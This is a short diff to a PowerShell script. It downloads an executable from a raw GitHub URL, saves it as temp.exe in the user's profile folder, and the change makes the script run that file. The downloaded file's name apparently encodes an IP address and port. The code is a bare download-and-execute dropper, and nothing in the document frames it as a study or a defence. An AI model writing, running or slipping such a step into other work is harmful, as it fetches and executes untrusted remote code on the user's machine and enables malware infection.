@@ -1,4 +1,5 @@
 $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/179_61_197_44_55639.exe"
 $dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "temp.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
-$dlPath
+cd $env:USERPROFILE
+.\temp.exe
